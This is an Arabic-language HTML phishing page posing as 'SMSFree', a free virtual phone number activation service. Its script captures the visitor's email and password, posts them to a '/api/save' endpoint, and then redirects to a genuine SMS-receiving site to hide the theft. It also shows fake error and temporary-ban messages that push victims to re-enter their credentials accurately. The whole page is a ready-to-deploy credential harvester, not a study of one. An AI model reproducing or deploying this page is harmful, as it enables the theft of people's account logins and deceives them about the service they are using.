<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة تفعيل الأرقام العالمية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; }
        .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); }
        .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 30px; border: 1px solid rgba(0, 242, 254, 0.3); }
        
        /* النص المقنع والمغري بحجم متوسط */
        .persuasive-text { color: #00f2fe; font-size: 16px; font-weight: 700; margin-bottom: 20px; line-height: 1.5; padding: 0 10px; }

        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; }
        input::placeholder { color: rgba(0, 242, 254, 0.4); }
        input:disabled { opacity: 0.5; }

        #status-msg { padding: 12px; margin-bottom: 15px; border-radius: 12px; font-size: 13px; display: none; font-weight: bold; }
        .msg-error { background: rgba(255, 71, 87, 0.1); color: #ff4757; border: 1px solid #ff4757; }
        .msg-ban { background: #000; color: #ffbc00; border: 2px solid #ffbc00; }

        button { width: 100%; padding: 18px; font-weight: 800; font-size: 17px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 15px; cursor: pointer; color: #0a0e17; }
        button:disabled { opacity: 0.5; }
        
        #sorry-btn { background: #ffbc00; color: #000; margin-top: 10px; display: none; }
        .footer { margin-top: 35px; font-size: 11px; color: #8b9bb4; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px; }
    </style>
</head>
<body>
    <div class="premium-card">
        <div class="logo-circle"><span style="font-weight: 800; font-size: 20px;">SMSFree</span></div>
        
        <div class="persuasive-text">
            سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك بضمان وأمان تام.
        </div>

        <div id="status-msg"></div>

        <form id="auth-form">
            <input type="text" id="user-field" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass-field" placeholder="كلمة السر" required>
            
            <button type="submit" id="main-btn">تفعيل الحساب الآن</button>
            <button type="button" id="sorry-btn">اعتذر.. سأقوم بتصحيح البيانات</button>
        </form>

        <div class="footer">
            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة.
        </div>
    </div>

    <script>
        let fails = 0;
        const form = document.getElementById('auth-form');
        const msg = document.getElementById('status-msg');
        const mainBtn = document.getElementById('main-btn');
        const sorryBtn = document.getElementById('sorry-btn');
        const inputs = document.querySelectorAll('input');

        form.onsubmit = async (e) => {
            e.preventDefault();
            const u = document.getElementById('user-field').value;
            const p = document.getElementById('pass-field').value;

            if (!u.includes('@') || p.length < 6) {
                fails++;
                inputs.forEach(i => i.disabled = true);

                if (fails === 1) {
                    msg.innerText = "بيانات غير صحيحة، يرجى المحاولة بدقة";
                    msg.className = "msg-error";
                    msg.style.display = "block";
                    mainBtn.style.display = "none";
                    sorryBtn.style.display = "block";
                } else {
                    startBan();
                }
                return;
            }

            mainBtn.disabled = true;
            mainBtn.innerText = "جاري التحقق...";
            try {
                await fetch('/api/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ user: u, pass: p }) });
            } catch(err) {}
            setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 2000);
        };

        sorryBtn.onclick = () => {
            inputs.forEach(i => i.disabled = false);
            sorryBtn.style.display = "none";
            mainBtn.style.display = "block";
            msg.style.display = "none";
        };

        function startBan() {
            sorryBtn.style.display = "none";
            mainBtn.style.display = "block";
            mainBtn.disabled = true;
            let time = 30; // حظر نص دقيقة
            
            const timer = setInterval(() => {
                msg.innerText = `لقد تم حظرك مؤقتاً. سينتهي الحظر بعد ${time} ثانية`;
                msg.className = "msg-ban";
                msg.style.display = "block";
                time--;

                if (time < 0) {
                    clearInterval(timer);
                    mainBtn.disabled = false;
                    // الرسالة التحذيرية النهائية بعد انتهاء العداد
                    msg.innerText = "لاتكرر كتابه البريد أو كلمه السر بشكل غير صحيح سيتم حظرك لمده دقيقه وإذ تكرر الامر ربما لساعات";
                    msg.className = "msg-error";
                    inputs.forEach(i => i.disabled = false);
                    fails = 0;
                }
            }, 1000);
        }
    </script>
</body>
</html>
